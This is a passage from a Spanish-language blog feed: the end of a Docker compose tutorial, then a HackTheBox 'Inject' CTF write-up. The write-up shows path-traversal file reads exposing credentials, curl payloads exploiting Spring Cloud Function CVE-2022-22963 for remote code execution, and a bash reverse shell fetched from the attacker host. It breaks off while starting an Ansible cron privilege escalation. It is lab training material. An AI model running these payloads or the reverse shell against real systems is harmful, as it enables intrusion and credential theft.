&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker87.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vemos en nuestro navegador que al igual que antes tenemos los datos que previamente creamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker88.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a añadir en nuestro codigo una linea en consola para que cuando listemos los estudiantes nos muestre un mensaje &lt;code&gt;Listando todos los estudiantes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker89.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora simplemente al guardar los cambios, automaticamente vemos el cambio reflejado gracias a &lt;code&gt;nodemon&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker90.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero vamos a validarlo como se debe y vamos a hacer que se ejecute el console que modificamos cuando recargamos la pagina , depaso tambien insertaremos un nuevo registro solo para probar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker91.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recargamos el navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker92.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Toca la prueba de fuego, volvemos a revisar los logs y mira lo que encontramos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi podemos tener un ambiente de desarrollo al usar &lt;code&gt;docker compose&lt;/code&gt; y aprendimos a usar esta grandiosa herramienta.&lt;/p&gt;

&lt;p&gt;Si te percataste falta algo importante que seguro te estas preguntando, y es la siguiente..&lt;/p&gt;

&lt;p&gt;Genial ya se como crear mis volumenes en docker pero y estos donde se almacenan por si quiero trabajar sobre estos?&lt;/p&gt;

&lt;p&gt;Pues bueno si estas en &lt;code&gt;linux&lt;/code&gt; solo debes dirigirte a la ruta &lt;code&gt;/var/lib/docker/volumes&lt;/code&gt;. y indicar el nombre del volumen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker93.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora si estas usando &lt;code&gt;Mac OS&lt;/code&gt; o &lt;code&gt;Windows&lt;/code&gt;, basta con abrir &lt;code&gt;docker desktop&lt;/code&gt; y dirirte a la sección &lt;code&gt;Volumes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Y bueno esto seria todo por esta oportunidad, espero haberte ayudado a comprender el funcionamiento de esta grandiosa herramienta y ahora si debes ponerte manos a la obra con los contenedores ya que ahora tienes un nuevo superpoder por que ahora dominas &lt;code&gt;Docker&lt;/code&gt;. 😎&lt;/p&gt;

&lt;p&gt;Hasta la proxima! 😄😊.&lt;/p&gt;
</description>
        <pubDate>Sat, 22 Jul 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/articulos/Docker</link>
        <guid isPermaLink="true">http://localhost:4000/articulos/Docker</guid>
        
        <category>Docker</category>
        
        <category>Contenedor</category>
        
        <category>DockerHub</category>
        
        
        <category>articulos</category>
        
      </item>
    
      <item>
        <title>Maquina Inject - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Inject&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un &lt;code&gt;LFI&lt;/code&gt; y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de &lt;code&gt;spring framework&lt;/code&gt; que nos otorgara &lt;code&gt;RCE&lt;/code&gt; y finalmente para elevar nuestros privilegios abusaremos de una &lt;code&gt;cron job&lt;/code&gt; para crearnos un archivo malicioso &lt;code&gt;ansible playbook&lt;/code&gt;, manipulando los permisos de la &lt;code&gt;bash&lt;/code&gt; y asi convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Inject
❯ ls

 Inject
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.11.204
PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=125 ms

--- 10.10.11.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 124.537/124.537/124.537/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:09 GMT
Initiating SYN Stealth Scan at 18:09
Scanning 10.10.11.204 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.204
Discovered open port 22/tcp on 10.10.11.204
Completed SYN Stealth Scan at 18:09, 15.98s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.13s latency).
Scanned at 2023-07-19 18:09:29 GMT for 16s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
           Raw packets sent: 78704 (3.463MB) | Rcvd: 78677 (3.147MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,8080 10.10.11.204 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:10 GMT
Nmap scan report for 10.10.11.204
Host is up (0.15s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.2p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nagios-nsca Nagios NSCA&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.11.204:8080
http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta no nos reporta mucha información, asi que vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que existe una sección de login y registro pero que esta actualmente en construcción.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la pagina principal tambien podemos ver una sección de &lt;code&gt;upload&lt;/code&gt;, la cual nos redirige a una ruta de subida de archivos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a tratar de subir un archivo simple con extensión &lt;code&gt;txt&lt;/code&gt; y vamos a interceptar la petición con &lt;code&gt;burpsuite&lt;/code&gt; para realizar pruebas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interceptamos la petición y la mandamos al &lt;code&gt;Repeater&lt;/code&gt;, y vemos como respuesta que solo podemos subir imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora alteramos la petición y cambiamos la extensión del archivo nos muestra un mensaje de subida correcta del archivo con su respectiva ruta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora desde consola intentamos apuntar a la ruta, listando un directorio atras, obtenemos un &lt;code&gt;LFI&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=..&quot;
java
resources
uploads
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos listar los usuarios de el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd&quot; | grep &quot;sh$&quot;
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora tratamos de listar el contenido del directorio de los usuarios, observamos un archivo &lt;code&gt;settings.xml&lt;/code&gt; en el directorio del usuario &lt;code&gt;frank&lt;/code&gt;. Vamos a exportar el contenido y dentro obtenemos unas credenciales del usuario &lt;code&gt;phill&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2&quot;
settings.xml
❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml&quot; -o settings.xml
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat settings.xml
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
  &amp;lt;servers&amp;gt;
    &amp;lt;server&amp;gt;
      &amp;lt;id&amp;gt;Inject&amp;lt;/id&amp;gt;
      &amp;lt;username&amp;gt;phil&amp;lt;/username&amp;gt;
      &amp;lt;password&amp;gt;DocPhillovestoInject123&amp;lt;/password&amp;gt;
      &amp;lt;privateKey&amp;gt;${user.home}/.ssh/id_dsa&amp;lt;/privateKey&amp;gt;
      &amp;lt;filePermissions&amp;gt;660&amp;lt;/filePermissions&amp;gt;
      &amp;lt;directoryPermissions&amp;gt;660&amp;lt;/directoryPermissions&amp;gt;
      &amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;
    &amp;lt;/server&amp;gt;
  &amp;lt;/servers&amp;gt;
&amp;lt;/settings&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de contectarnos por el servicio &lt;code&gt;ssh&lt;/code&gt;, las credenciales no son correctas, y si ahora listamos dos directorios atras, encontramos otro archivo &lt;code&gt;pom.xml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../&quot;
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vemos el contenido vemos que esta relacionado a &lt;code&gt;spring framework&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat pom.xml
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
	xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
	&amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
	&amp;lt;parent&amp;gt;
		&amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
		&amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
		&amp;lt;version&amp;gt;2.6.5&amp;lt;/version&amp;gt;
		&amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Spring Framework : Spring es un framework para el desarrollo de aplicaciones y contenedor de inversión de control, de código abierto para la plataforma Java.​ La primera versión fue escrita por Rod Johnson, quien lo lanzó junto a la publicación de su libro Expert One-on-One J2EE Design and Development.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si buscamos un poco encontramos un exploit que nos otorga &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&quot;&gt;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si abrimos el explit, observamos que este se aprovecha de una ruta &lt;code&gt;functionRouter&lt;/code&gt; y envia un payload diseñado a traves de los headers donde ejecuta finalmente un comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como no es tan complejo su explotación podemos hacerlo manualmente incoporando los parametros requeridos con el propio &lt;code&gt;curl&lt;/code&gt;. Nos mandamos una traza a nuestra maquina host.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;ping -c 1 10.10.16.2&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T18:56:07.739+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y recibimos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:56:22.791783 IP 10.10.11.204 &amp;gt; 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
18:56:22.791819 IP 10.10.16.2 &amp;gt; 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ganar acceso vamos a crearnos un archivo en bash de nombre &lt;code&gt;index.html&lt;/code&gt; que nos otorgue una reverse shell, el cual nos compartiremos y almancenaremos en la maquina victima para posteriormente ejecutarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat index.html
#!/bin/bash

bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realizamos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;curl 10.10.16.2 -o /tmp/reverse&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T18:58:54.291+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la petición en nuestro servicio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.204 - - [19/Jul/2023 18:59:09] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos ejecutarlo y ponermos en escucha con &lt;code&gt;ntcat&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/reverse&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T19:05:11.598+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}#                        
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos acceso como el usuario &lt;code&gt;frank&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.204.
Ncat: Connection from 10.10.11.204:60530.
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
whoami
frank
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre hacemos el tratamiento para obtener una full &lt;code&gt;tty&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
frank@inject:/$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
frank@inject:/$ export TERM=xterm
frank@inject:/$ export SHELL=bash
frank@inject:/$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora buscamos la flag y intentamos leerla vemos que no contamos con permisos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ find / -name user.txt 2&amp;gt;/dev/null
/home/phil/user.txt
^C
frank@inject:/$ cat /home/phil/user.txt
cat: /home/phil/user.txt: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recordemos que antes obtuvimos unas credenciales del usuario &lt;code&gt;phil&lt;/code&gt;, asi que vamos a tratar de usar esa contraseña y migrar al usuario &lt;code&gt;phil&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ su phil
Password: 
phil@inject:/$ whoami
phil
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/$ cd /home/phil/
phil@inject:~$ cat user.txt 
7b309ae956b0821aef61ef39aa5d4f7e
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ya que somos el usuario &lt;code&gt;phil&lt;/code&gt;, listamos los grupos a los cuales pertenecemos y vemos uno correspondiente a &lt;code&gt;staff&lt;/code&gt;. Seguidamente listamos los recuros a los que tenemos acceso.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:~$ find / -group staff 2&amp;gt;/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid
phil@inject:~$ /opt/automation/tasks
bash: /opt/automation/tasks: Is a directory
phil@inject:~$ ls -l /opt/automation/tasks
total 4
-rw-r--r-- 1 root root 150 Jul 19 20:02 playbook_1.yml
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos un &lt;code&gt;playbook.yml&lt;/code&gt;, si investigamos un poco encotramos que esta relacionado a ansible.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Un playbook de Ansible® es un plano técnico de las tareas de automatización, las cuales son acciones complejas de TI cuya ejecución se lleva a cabo con muy poca intervención humana o sin ella.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a crearnos un procmon, para listar los procesos que se estan ejecutando a intervalos regulares de tiempo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ cat procmon.sh
#!/bin/bash

old_process=$(ps -eo user, command)

while true; do
	new_process=$(ps -eo user, command)
	diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;procmon|kworker|command&quot;
	old_process=$new_process
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script y obervamos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando un borrado de todo lo que se encuentra en el directorio &lt;code&gt;tasks&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ ./procmon.sh 
&amp;lt; root     /usr/sbin/CRON -f
&amp;lt; root     /bin/sh -c sleep 10 &amp;amp;&amp;amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;amp;&amp;amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
&amp;lt; root     sleep 10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que podemos hacer es crearnos un archivo similar a &lt;code&gt;playbook_1.yml&lt;/code&gt; para insertar un comando y al ejecutar la tarea el usuario &lt;code&gt;root&lt;/code&gt;, podemos tratar de cambiar los permisos de la &lt;code&gt;bash&lt;/code&gt; otorgandole &lt;code&gt;suid&lt;/code&gt; y asi poder convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello primero debemos crearnos un archivo &lt;code&gt;reverse.yml&lt;/code&gt; malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.&lt;/p&gt;

&lt;ul&gt;
